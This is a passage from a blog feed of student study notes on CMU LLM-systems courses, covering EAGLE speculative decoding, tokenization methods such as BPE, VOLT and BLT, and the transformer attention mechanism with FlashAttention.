class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        &quot;How can&quot;</span><br><span class="line">       /        \</span><br><span class="line">    &quot;I&quot;          ...</span><br><span class="line">   /    \</span><br><span class="line">&quot;make&quot;  &quot;help&quot;</span><br><span class="line"> |       |</span><br><span class="line">&quot;a&quot;    &quot;with&quot;</span><br><span class="line">...     ...</span><br></pre></td></tr></table></figure><p>Implementation uses <strong>tree attention</strong>: flatten allcandidates into a single sequence with a tree-shaped attention mask,allowing efficient parallel computation.</p><h3 id="training">Training</h3><p>EAGLE’s draft layer is trained with a combined loss:</p><p><span class="math display">\[L = L_{\text{reg}} + w_{\text{cls}} \cdot L_{\text{cls}}\]</span></p><p><strong>Regression loss</strong> (feature prediction): <spanclass="math display">\[L_{\text{reg}} = \text{SmoothL1}\left(f_{i+1}, \;\text{DraftModel}(T_{2:i+1}, F_{1:i})\right)\]</span></p><p>where <span class="math inline">\(T_{2:i+1}\)</span> are tokenembeddings and <span class="math inline">\(F_{1:i} = (f_1, \ldots,f_i)\)</span> are target model features.</p><p><strong>Classification loss</strong> (token prediction): <spanclass="math display">\[L_{\text{cls}} = \text{CrossEntropy}\left(p_{i+2}, \;\hat{p}_{i+2}\right)\]</span></p><p>where <span class="math inline">\(p_{i+2} =\text{Softmax}(\text{LMHead}(f_{i+1}))\)</span> and <spanclass="math inline">\(\hat{p}_{i+2} =\text{Softmax}(\text{LMHead}(\hat{f}_{i+1}))\)</span>.</p><h3 id="results">Results</h3><p>EAGLE achieves significantly faster decoding than vanilla speculativedecoding on MT-Bench, with minimal quality degradation.</p><h3 id="further-improvements">Further Improvements</h3><ul><li><strong>EAGLE-2</strong>: Prunes low-confidence tokens in the drafttree, reducing wasted computation</li><li><strong>EAGLE-3</strong>: Scales the method to larger trainingdatasets for better draft quality</li></ul><h3 id="code">Code</h3><ul><li><ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/speculative_decoding/Speculative_decoding_demo.ipynb">SpeculativeDecoding Demo</a></li><li><ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/speculative_decoding/EAGLE/demo.py">EAGLEDemo</a></li></ul><hr /><h2 id="summary">Summary</h2><table><colgroup><col style="width: 33%" /><col style="width: 25%" /><col style="width: 41%" /></colgroup><thead><tr class="header"><th>Method</th><th>Type</th><th>Key Idea</th></tr></thead><tbody><tr class="odd"><td>Gumbel Max Trick</td><td>Efficient sampling</td><td>Replace softmax + multinomial with addition + argmax</td></tr><tr class="even"><td>Beam Search Pruning</td><td>Search optimization</td><td>Discard low-scoring candidates early</td></tr><tr class="odd"><td>Speculative Decoding</td><td>Acceleration</td><td>Draft cheap, validate in parallel</td></tr><tr class="even"><td>EAGLE</td><td>Improved speculation</td><td>Predict features instead of tokens, tree-structured drafts</td></tr></tbody></table><p><strong>Key takeaway</strong>: From a systems perspective, thebottleneck of LLM decoding is the sequential, memory-bound nature ofautoregressive generation. Speculative decoding and EAGLE address thisby converting serial generation into parallel validation — thefundamental insight being that <strong>verification is cheaper thangeneration</strong> with causal attention.</p><h2 id="references">References</h2><ol type="1"><li>Freitag &amp; Al-Onaizan. “Beam Search Strategies for Neural MachineTranslation.” 2017.</li><li>Kool et al. “Stochastic Beams and Where to Find Them: TheGumbel-Top-k Trick for Sampling Sequences Without Replacement.” ICML2019.</li><li>Leviathan et al. “Fast Inference from Transformers via SpeculativeDecoding.” ICML 2023.</li><li>Li et al. “EAGLE: Speculative Sampling Requires Rethinking FeatureUncertainty.” ICML 2024.</li></ol><hr /><p><em>This post is based on lecture materials from CMU 11-868 LLMSystems by Lei Li.</em></p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 LLM Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> 11868 </tag>
            
            <tag> Decoding </tag>
            
            <tag> Speculative Decoding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys: Tokenization and Embedding</title>
      <link href="/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/"/>
      <url>/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/</url>
      
        <content type="html"><![CDATA[<h1 id="tokenization-and-embedding">Tokenization and Embedding</h1><h2 id="what-is-tokenization">What is Tokenization?</h2><p>Tokenization is the process of splitting text into basic units(tokens) that can be processed by language models. Many words don’t mapto a single token - for example, “indivisible” might be split intomultiple subword tokens.</p><p>The general pipeline is: 1. <strong>Tokenizer</strong>: Split textinto token IDs 2. <strong>Embedding table lookup</strong>: Convert tokenIDs to vector representations</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212204629477.png" alt="image-20260212204629477" style="zoom:30%;" /></p><h2 id="simple-tokenization-approaches">Simple TokenizationApproaches</h2><h3 id="word-level-tokenization">Word-level Tokenization</h3><p><strong>Approach</strong>: Break text by spaces and punctuation</p><p><strong>Examples</strong>: - English, French, German, Spanish workwell - Special treatment: numbers replaced by special token<code>[number]</code></p><p><strong>Example</strong>: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;The most eager is Oregon which is enlisting 5,000 drivers in the country&#x27;s biggest experiment.&quot;</span><br><span class="line">↓</span><br><span class="line">[&quot;The&quot;, &quot;most&quot;, &quot;eager&quot;, &quot;is&quot;, &quot;Oregon&quot;, &quot;which&quot;, &quot;is&quot;, &quot;enlisting&quot;, &quot;5,000&quot;, &quot;drivers&quot;, ...]</span><br></pre></td></tr></table></figure></p><p><strong>Challenge</strong>: What exactly is a “word”? - Clitics:“Bob’s” - Compounds: “handyman” - Multi-word expressions:“do-it-yourself” - Contractions: “isn’t”</p><p><strong>Pros and Cons</strong>: - ✅ Easy to implement - ❌Out-of-vocabulary (OOV) tokens (e.g., “Covid”) - ❌ Tradeoff betweenvocabulary size and unknown tokens: - Smaller vocab → fewer parameters,more OOV - Larger vocab → more parameters, less OOV - ❌ Hard forlanguages without spaces (Chinese, Japanese, Korean, Khmer)</p><h3 id="character-level-tokenization">Character-level Tokenization</h3><p><strong>Approach</strong>: Each letter and punctuation is a token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;The most eager is Oreg...&quot;</span><br><span class="line">↓</span><br><span class="line">[&quot;T&quot;, &quot;h&quot;, &quot;e&quot;, &quot; &quot;, &quot;m&quot;, &quot;o&quot;, &quot;s&quot;, &quot;t&quot;, &quot; &quot;, &quot;e&quot;, &quot;a&quot;, &quot;g&quot;, &quot;e&quot;, &quot;r&quot;, ...]</span><br></pre></td></tr></table></figure><p><strong>Pros</strong>: - ✅ Very small vocabulary (except forlanguages like Chinese) - ✅ No OOV tokens</p><p><strong>Cons</strong>: - ❌ Longer sequences - ❌ Tokens don’trepresent semantic meaning</p><h2 id="subword-level-tokenization">Subword-level Tokenization</h2><h3 id="goal">Goal</h3><ul><li>Moderate size vocabulary</li><li>No OOV tokens</li><li>Represent rare words by sequences of subwords</li></ul><h3 id="byte-pair-encoding-bpe">Byte Pair Encoding (BPE)</h3><p><strong>Origin</strong>: Originally developed for data compression byPhilip Gage (1994)</p><p><strong>Algorithm for Building Vocabulary</strong>: 1. Initializevocabulary with all characters as tokens (plus end-of-word symbol) andtheir frequencies 2. Loop until vocabulary size reaches capacity: 1.Count successive pairs of tokens in corpus 2. Rank and select the mostfrequent pair 3. Merge the pair to form a new token, add to vocabulary3. Output final vocabulary</p><p><strong>Example</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Initial corpus:</span><br><span class="line">cat: 90</span><br><span class="line">catch: 50</span><br><span class="line">rat: 80</span><br><span class="line">rattle: 40</span><br><span class="line"></span><br><span class="line">Step 1: Start with characters</span><br><span class="line">Vocab: &#123;a, c, e, h, l, t&#125;</span><br><span class="line"></span><br><span class="line">Step 2: Merge &#x27;a&#x27; + &#x27;t&#x27; (most frequent)</span><br><span class="line">Vocab: &#123;a, c, e, h, l, t, at&#125;</span><br><span class="line"></span><br><span class="line">Step 3: Merge &#x27;c&#x27; + &#x27;at&#x27;</span><br><span class="line">Vocab: &#123;a, c, e, h, l, t, at, cat&#125;</span><br><span class="line"></span><br><span class="line">Step 4: Merge &#x27;r&#x27; + &#x27;at&#x27;</span><br><span class="line">Vocab: &#123;a, c, e, h, l, t, at, cat, rat&#125;</span><br><span class="line"></span><br><span class="line">Step 5: Merge &#x27;cat&#x27; + &#x27;c&#x27;</span><br><span class="line">Vocab: &#123;a, c, e, h, l, t, at, cat, rat, catc&#125;</span><br></pre></td></tr></table></figure><p><strong>Tokenization Process</strong>: 1. Split text by space orother delimiters 2. Repeat: - Greedily find the longest prefix thatmatches a token in BPE dictionary - Split and process remaining partsuntil no more text left</p><p><strong>Example Output</strong>: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;The most eager is Oregon which is enlisting 5,000 drivers in the country&#x27;s biggest experiment.&quot;</span><br><span class="line">↓</span><br><span class="line">[&quot;The&quot;, &quot;most&quot;, &quot;eager&quot;, &quot;is&quot;, &quot;Oregon&quot;, &quot;which&quot;, &quot;is&quot;, &quot;en&quot;, &quot;listing&quot;, &quot;5,000&quot;, &quot;driver&quot;, &quot;s&quot;, &quot;in&quot;, &quot;the&quot;, &quot;country&quot;, &quot;&#x27;s&quot;, &quot;big&quot;, &quot;g&quot;, &quot;est&quot;, &quot;experiment&quot;, &quot;.&quot;]</span><br></pre></td></tr></table></figure></p><p><strong>Code Examples</strong>:</p><ul><li>Official example: <ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/tokenization/tokenization.ipynb">llmsys_code_examples/tokenization</a></li><li><strong>My implementation</strong>: See <ahref="../CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch.html#2-bpe-tokenizer">CS336Assignment 1: BPE Tokenizer</a> for a complete from-scratchimplementation with parallel pre-tokenization, including:<ul><li>BPE training algorithm with incremental pair updates</li><li>Parallel corpus processing using multiprocessing</li><li>Memory optimization techniques</li><li>Full encoder/decoder implementation</li><li>Code: <ahref="https://github.com/XLOverflow/CS336_Transformer_from_Scratch">GitHub- CS336 Transformer</a></li></ul></li></ul><h2 id="information-theoretic-vocabulary-volt">Information-TheoreticVocabulary (VOLT)</h2><h3 id="motivation">Motivation</h3><p>Finding the optimal vocabulary traditionally requires: - Multiplefull training and testing cycles - Trying different vocabulary sizes(1k, 10k, 30k tokens) - Evaluating NLG/MT performance for eachconfiguration</p><p><strong>Challenge</strong>: Can we predict good vocabulary withoutfull training?</p><h3 id="measuring-vocabulary-quality">Measuring Vocabulary Quality</h3><p><strong>1. Compression Metrics</strong>: - <strong>Bytes Per Token(BPT)</strong>: <span class="math display">\[BPT = \frac{\text{utf8bytes}}{\text{tokens}}\]</span></p><ul><li><strong>Normalized Sequence Length (NSL)</strong>: <spanclass="math display">\[NSL = \frac{\text{tokens}}{\text{tokens inLLaMA}}\]</span></li></ul><p><strong>2. Normalized Entropy</strong>: <spanclass="math display">\[\mathcal{H}(v) = -\frac{1}{l_v}\sum_{i \in v}P(i)\log P(i)\]</span></p><p>where <span class="math inline">\(l_v\)</span> is the average numberof characters for all tokens in vocabulary <spanclass="math inline">\(v\)</span>.</p><p><strong>Interpretation</strong>: Measuressemantic-information-per-character. Smaller is better (less ambiguity,easier to generate).</p><p><strong>Example</strong>: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vocabulary 1: &#123;a: 200, e: 90, c: 30, t: 30, s: 90&#125;</span><br><span class="line">→ H(v) = 1.37</span><br><span class="line"></span><br><span class="line">Vocabulary 2: &#123;a: 100, aes: 90, cat: 30&#125;</span><br><span class="line">→ H(v) = 0.14 ✓ Better!</span><br></pre></td></tr></table></figure></p><h3 id="marginal-utility-of-vocabulary-muv">Marginal Utility ofVocabulary (MUV)</h3><p><strong>Definition</strong>: <span class="math display">\[M_{v_k\rightarrow v_{k+m}} = -\frac{H(v_k) - H(v_{k+m})}{m}\]</span></p><ul><li><strong>Value</strong>: Normalized Entropy (semanticinformation)</li><li><strong>Cost</strong>: Vocabulary size</li><li><strong>MUV</strong>: Negative gradient of normalized entropy withrespect to size</li><li><strong>Interpretation</strong>: How much value each added tokenbrings</li></ul><h3 id="key-finding-muv-predicts-performance">Key Finding: MUV PredictsPerformance</h3><p>Empirical observations: - <strong>Maximum MUV correlates with bestBLEU scores</strong> - MUV and BLEU are correlated on ~2/3 of tasks -MUV serves as a <strong>coarse-grained evaluation metric</strong> forvocabulary quality</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205224848.png" alt="image-20260212205224848" style="zoom:30%;" /></p><h2 id="practical-considerations-in-llms">Practical Considerations inLLMs</h2><h3 id="corpus-deduplication-and-filtering">1. Corpus Deduplication andFiltering</h3><p><strong>LLaMA 3 Deduplication Strategy</strong>: - <strong>URL-leveldedup</strong>: Remove duplicate URLs - <strong>Document-leveldedup</strong>: Using MinHash - <strong>Line-level dedup</strong>: UsingSHA-1 64-bit hash for every 30M docs - Removes boilerplate (navigationmenus, cookie warnings, contact info)</p><p><strong>Filtering</strong>: - N-gram repeats within one line - “Dirtyword” counting - Token distribution KL divergence too different fromcorpus</p><h3 id="modern-subword-tokenization-methods">2. Modern SubwordTokenization Methods</h3><p><strong>Byte-level BPE (BBPE)</strong>: - Treats language as sequenceof Unicode bytes - Universal for all languages - No need forlanguage-specific preprocessing</p><p><strong>WordPiece</strong>: - Similar to BPE, but merges pairs thatmaximize <span class="math inline">\(P(b|a)\)</span> - Used in BERT</p><p><strong>SentencePiece</strong>: - Uniform treatment of spaces andpunctuation - Replaces space ’ ’ with _ (U+2581) - Then splits intocharacters and applies BPE - Language-agnostic approach</p><h3 id="handling-code-pre-tokenization">3. Handling Code:Pre-tokenization</h3><p>Use regular expressions to split sequences intelligently:</p><p><strong>GPT-4 Pattern</strong>: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?i:&#x27;s|&#x27;t|&#x27;re|&#x27;ve|&#x27;m|&#x27;ll|&#x27;d)|[^\r\n\p&#123;L&#125;\p&#123;N&#125;]?\p&#123;L&#125;+|\p&#123;N&#125;&#123;1,3&#125;|...</span><br></pre></td></tr></table></figure></p><p>Components: - English contractions - Words (with optional leadingnon-alphanumeric) - Digits (1-3 at a time) - Non-alphanumeric characters- Line breaks - Trailing whitespace</p><p><strong>Example</strong>: <code>.append</code> → single token (keepsmethod names intact)</p><h3 id="handling-numbers">4. Handling Numbers</h3><p><strong>Challenge</strong>: Traditional tokenization treats eachdigit separately, making arithmetic difficult.</p><p><strong>xVal Approach</strong> (Golkar et al., 2023): - Replacenumbers with special <code>[NUM]</code> token - Add continuous numericalembedding alongside discrete token embedding - Dual-head decoder: -<strong>Token head</strong>: Predicts next token (logits) -<strong>Number head</strong>: Predicts numerical value</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205430637.png" alt="image-20260212205430637" style="zoom:50%;" /></p><h3 id="multilingual-vocabulary">5. Multilingual Vocabulary</h3><p><strong>LLaMA 3 Evolution</strong>: - LLaMA 2: 32k tokens - LLaMA3.1: 128k tokens - 100k from OpenAI’s tiktoken (reduced from 200k) - 28kallocated to multilingual support</p><p><strong>Construction Methods</strong>:</p><ol type="1"><li><strong>Joint BPE</strong>: Combine documents from multiplelanguages (176 in LLaMA 3), apply BPE on joint corpus</li><li><strong>Per-language BPE + Merge</strong>: Generate same number oftokens for each language, then merge</li><li><strong>ALP Balancing</strong>: Allocate capacity by balancingAverage Log Probability across languages</li></ol><p><strong>Vocabulary Sharing Benefits</strong>:</p><p>Shared tokens enable cross-lingual transfer. Example - “television”in multiple languages: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">English: television      Spanish: televisión</span><br><span class="line">French: television       Italian: television</span><br><span class="line">Dutch: televisie        Portuguese: televisão</span><br><span class="line">Swedish: television     Finnish: televisio</span><br></pre></td></tr></table></figure></p><p>Similar spellings → shared subword tokens → multilingualunderstanding</p><h2 id="vocabulary-sharing-and-multilingual-performance">VocabularySharing and Multilingual Performance</h2><h3 id="experimental-setup">Experimental Setup</h3><p>Research by Yuan et al. (ACL 2024) investigated: 1. Construct 10kinstruction fine-tuning dataset using bilingual parallel data 2.Fine-tune LLaMA-7B embedding layer only 3. Evaluate translationperformance: - <strong>Bilingual</strong>: Supervised language pair -<strong>Multilingual</strong>: All other directions</p><h3 id="four-quadrants-of-performance">Four Quadrants ofPerformance</h3><table><thead><tr class="header"><th>Quadrant</th><th>Bilingual Perf.</th><th>Multilingual Perf.</th><th>Example Languages</th></tr></thead><tbody><tr class="odd"><td><strong>Reciprocal</strong></td><td>↑</td><td>↑</td><td>cs, da, fr, de</td></tr><tr class="even"><td><strong>Altruistic</strong></td><td>↓</td><td>↑</td><td>ar, vi, zh, ko</td></tr><tr class="odd"><td><strong>Stagnant</strong></td><td>↓</td><td>↓</td><td>km, lo, gu, te</td></tr><tr class="even"><td><strong>Selfish</strong></td><td>↑</td><td>↓</td><td>hi</td></tr></tbody></table><p><strong>Key Insight</strong>: Fine-tuning on bilingual data doesn’talways benefit the supervised direction!</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205611162.png" alt="image-20260212205611162" style="zoom:30%;" /></p><h3 id="language-families-matter">Language Families Matter</h3><ul><li><strong>Indo-European languages</strong>: Mostly in Reciprocalquadrant</li><li><strong>Non-Indo-European languages</strong>: More varieddistribution, including Altruistic and Stagnant quadrants</li></ul><h3 id="stagnant-quadrant-over-tokenization-problem">Stagnant Quadrant:Over-tokenization Problem</h3><p><strong>Root Cause</strong>: Byte-BPE produces longer byte sequencesthan character counts for some languages.</p><p><strong>Example</strong>: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">饕 [tāo] (gluttonous) → three tokens: [227, 234, 260]</span><br></pre></td></tr></table></figure></p><p><strong>Solution - Shortening</strong>: - Remove common byte prefixes(e.g., 227 for many Chinese characters) - Improves both bilingual andmultilingual performance</p><p><strong>Experimental Results</strong>: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Direction: en→km   en→lo   en→gu   en→te</span><br><span class="line">Full FT:   10.1    7.0     10.0    17.0</span><br><span class="line">Extend:    11.9    6.9     0.5     7.2</span><br><span class="line">Shorten:   12.7    9.4     11.3    21.6  ✓ Best</span><br></pre></td></tr></table></figure></p><p><strong>Recommendation</strong>: Shortening is more effective thanextending vocabulary for over-tokenized languages.</p><h2id="tokenizer-free-models-byte-latent-transformer-blt">Tokenizer-freeModels: Byte Latent Transformer (BLT)</h2><p><strong>Motivation</strong>: Eliminate tokenizer entirely, workdirectly with bytes.</p><p><strong>Architecture</strong> (Pagnoni et al., 2024):</p><ol type="1"><li><strong>Byte-Level Small Transformer</strong>: Encodes bytestream</li><li><strong>Entropy-Based Grouping</strong>: Groups bytes into patchesvia cross-attention</li><li><strong>Large Latent Transformer</strong>: Predicts next patch (maincomputation)</li><li><strong>Unpatching</strong>: Converts patches back to byte sequencevia cross-attention</li><li><strong>Small Byte-Level Transformer</strong>: Makes next-byteprediction</li></ol><p><strong>Key Benefits</strong>: - ✅ No tokenizer training needed - ✅Universal across all languages - ✅ Handles any byte stream (text, code,data) - ✅ Dynamic granularity (entropy-based patching)</p><p><strong>Trade-offs</strong>: - More complex architecture - Two-leveltransformer hierarchy - Cross-attention overhead</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205638769.png" alt="image-20260212205638769" style="zoom:40%;" /></p><h2 id="summary">Summary</h2><h3 id="key-takeaways">Key Takeaways</h3><ol type="1"><li><strong>Subword Tokenization (BPE)</strong>:<ul><li>Iteratively merges most frequent token pairs</li><li>Balances vocabulary size and OOV rate</li><li>Widely used (GPT, LLaMA, etc.)</li></ul></li><li><strong>Information-Theoretic Vocabulary (VOLT)</strong>:<ul><li>Uses normalized entropy to measure vocabulary quality</li><li>MUV (Marginal Utility of Vocabulary) predicts performance</li><li>Solves entropy-constrained optimal transport problem</li><li>Avoids expensive grid search</li></ul></li><li><strong>Practical Considerations</strong>:<ul><li>Pre-tokenization with regex for code</li><li>Special handling for numbers (xVal approach)</li><li>Corpus deduplication at multiple levels</li><li>Multilingual vocabulary allocation</li></ul></li><li><strong>Multilingual Challenges</strong>:<ul><li>Vocabulary sharing enables cross-lingual transfer</li><li>Over-tokenization hurts some languages (stagnant quadrant)</li><li>Shortening byte sequences more effective than extendingvocabulary</li><li>Language families affect sharing benefits</li></ul></li><li><strong>Future Direction</strong>:<ul><li>Tokenizer-free models (BLT) show promise</li><li>Trade-off between simplicity and efficiency</li><li>Dynamic granularity via entropy-based patching</li></ul></li></ol><h2 id="references">References</h2><ol type="1"><li>Rico Sennrich et al. “Neural Machine Translation of Rare Words withSubword Units.” ACL 2016.</li><li>Xu, Zhou, Gan, Zheng, Li. “Vocabulary Learning via Optimal Transportfor Neural Machine Translation.” ACL 2021.</li><li>Kudo and Richardson. “SentencePiece: A simple and languageindependent approach to subword tokenization.” EMNLP 2018.</li><li>Dagan et al. “Getting the most out of your tokenizer forpre-training and domain adaptation.” ICML 2024.</li><li>Golkar et al. “xVal: A Continuous Numerical Tokenization forScientific Language Models.” 2023.</li><li>Zheng et al. “Allocating large vocabulary capacity for cross-linguallanguage model pre-training.” EMNLP 2021.</li><li>Liang et al. “XLM-V: Overcoming the Vocabulary Bottleneck inMultilingual Masked Language Models.” EMNLP 2023.</li><li>Yuan et al. “How Vocabulary Sharing Facilitates Multilingualism inLLaMA?” ACL 2024.</li><li>Pagnoni et al. “Byte Latent Transformer: Patches Scale Better ThanTokens.” 2024.</li></ol><h2 id="demo-tools">Demo Tools</h2><p>Interactive tokenizer demos: - <ahref="https://belladorai.github.io/llama-tokenizer-js/example-demo/build/">LLaMATokenizer</a> - <a href="https://koala.sh/tools/free-gpt-tokenizer">GPTTokenizer</a></p><hr /><p><em>This post is based on lecture materials from CMU 11-868 LLMSystems by Lei Li.</em></p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 LLM Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> 11868 </tag>
            
            <tag> Tokenization </tag>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15642 Machine Learning Systems: Transformer, Attention, and Optimizations</title>
      <link href="/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/"/>
      <url>/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/</url>
      
        <content type="html"><![CDATA[<h1 id="transformer-attention-and-optimizations">Transformer, Attention,and Optimizations</h1><p>Course: 15-442/15-642 Machine Learning Systems Instructors: TianqiChen and Zhihao Jia Carnegie Mellon University</p><h2 id="attention-mechanism">Attention Mechanism</h2><p>The attention mechanism is an approach where individual states arecombined using weights.</p><h3 id="basic-concept">Basic Concept</h3><p>For hidden states <span class="math inline">\(h_1, h_2, h_3,h_4\)</span> from previous layer inputs <span class="math inline">\(x_1,x_2, x_3, x_4\)</span>:</p><p><span class="math display">\[h_t = \sum_{i=1}^{t} s_i x_t\]</span></p><p>where <span class="math inline">\(s_i\)</span> is the “attentionscore” that computes how relevant position <spanclass="math inline">\(i\)</span>’s input is to the current hiddenoutput.</p><h2 id="self-attention">Self-Attention</h2><p>Self-attention maps a query and a set of key-value pairs to anoutput.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209181943450.png" alt="image-20260209181943450" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182022983.png" alt="image-20260209182022983" style="zoom:30%;" /></p><h3 id="mathematical-formulation">Mathematical Formulation</h3><p><span class="math display">\[A(Q, K, V) = \text{softmax}\left(\frac{QK^T}{\sqrt{d}}\right)V\]</span></p><p>Where: - <strong>Q (Query)</strong>: <span class="math inline">\(N\times d\)</span> matrix - <strong>K (Keys)</strong>: <spanclass="math inline">\(N \times d\)</span> matrix - <strong>V(Values)</strong>: <span class="math inline">\(N \times d\)</span>matrix - <strong>d</strong>: dimension of key/query/value vectors -<strong>N</strong>: sequence length</p><h3 id="computation-steps">Computation Steps</h3><ol type="1"><li><p>Compute <strong>queries</strong>, <strong>keys</strong>, and<strong>values</strong> from input embeddings:</p><ul><li><span class="math inline">\(Q = X W^Q\)</span></li><li><span class="math inline">\(K = X W^K\)</span></li><li><span class="math inline">\(V = X W^V\)</span></li></ul></li><li><p>Calculate attention scores: <span class="math inline">\(S =QK^T\)</span> (size: <span class="math inline">\(N \timesN\)</span>)</p></li><li><p>Scale by <span class="math inline">\(\sqrt{d}\)</span>: <spanclass="math inline">\(S&#39; = S / \sqrt{d}\)</span></p></li><li><p>Apply softmax: <span class="math inline">\(A =\text{softmax}(S&#39;)\)</span></p></li><li><p>Multiply by values: <span class="math inline">\(O =AV\)</span></p></li></ol><h2 id="multi-head-self-attention">Multi-Head Self-Attention</h2><p>Multi-head attention parallelizes attention layers with differentlinear transformations on input and output.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182102524.png" alt="image-20260209182102524" style="zoom:40%;" /></p><h3 id="benefits">Benefits</h3><ul><li><strong>More parallelism</strong>: Can process multiplerepresentation subspaces simultaneously</li><li><strong>Reduced computation cost per head</strong>: Each head workswith smaller dimensions</li></ul><h3 id="formulation">Formulation</h3><p>For each head <span class="math inline">\(i\)</span>: <spanclass="math display">\[Z_i = A(Q_i, K_i, V_i) = \text{softmax}\left(\frac{Q_iK_i^T}{\sqrt{d}}\right)V_i\]</span></p><p>Final output: <span class="math display">\[Z = \text{MultiHead}(Q, K, V) = \text{Concat}(Z_0, \ldots, Z_7)W^O\]</span></p><p>where typically 8 heads are used, each processing a <spanclass="math inline">\(d/8\)</span> dimensional subspace.</p><h2 id="computing-attention-on-gpus---challenges">Computing Attention onGPUs - Challenges</h2><h3 id="standard-attention-computation">Standard AttentionComputation</h3><p>The naive approach: <span class="math inline">\(O =\text{Softmax}(QK^T)V\)</span></p><p><strong>Workflow:</strong> 1. <span class="math inline">\(A =QK^T\)</span> : <span class="math inline">\(N \times N\)</span> matrix2. <span class="math inline">\(A = \text{mask}(A)\)</span> (for causalattention) 3. <span class="math inline">\(A = \text{softmax}(A)\)</span>: <span class="math inline">\(N \times N\)</span> matrix 4. <spanclass="math inline">\(O = AV\)</span> : <span class="math inline">\(N\times d\)</span> matrix</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182126065.png" alt="image-20260209182126065" style="zoom:50%;" /></p><h3 id="key-challenges">Key Challenges</h3><ol type="1"><li><strong>Large intermediate results</strong>: <spanclass="math inline">\(O(N^2)\)</span> attention matrix</li><li><strong>Repeated reads/writes from GPU device memory</strong>:Memory bandwidth bottleneck</li><li><strong>Cannot scale to long sequences</strong>: Quadratic memoryrequirement</li></ol><h2 id="gpu-memory-hierarchy">GPU Memory Hierarchy</h2><p><strong>NVIDIA A100 GPU:</strong></p><ul><li><strong>Per-block shared memory (SRAM)</strong>: 19 TB/s bandwidth,20 MB capacity<ul><li>Readable/writable by all threads in a block</li><li>Fast but small</li></ul></li><li><strong>Device global memory (HBM - High Bandwidth Memory)</strong>:1.5 TB/s bandwidth, 80 GB capacity<ul><li>Readable/writable by all threads</li><li><strong>~12.6x slower than SRAM</strong></li><li>Large capacity but slower access</li></ul></li></ul><p><strong>HBM (High Bandwidth Memory)</strong> is the GPU’s main memory- it has large capacity but is much slower than on-chip SRAM.FlashAttention’s core optimization is to <strong>minimize HBMaccesses</strong> by doing as much computation as possible in fastSRAM.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182214092.png" alt="image-20260209182214092" style="zoom:50%;" /></p><h2 id="flashattention-io-aware-exact-attention">FlashAttention:IO-Aware Exact Attention</h2><h3 id="key-idea">Key Idea</h3><p>Compute attention by blocks to reduce global memory access</p><h3 id="two-main-techniques">Two Main Techniques</h3><h4 id="tiling">1. Tiling</h4><p>Restructure algorithm to load query/key/value block by block fromglobal to shared memory:</p><ol type="1"><li>Load inputs by blocks from HBM to SRAM</li><li>On-chip, compute attention output w.r.t. the 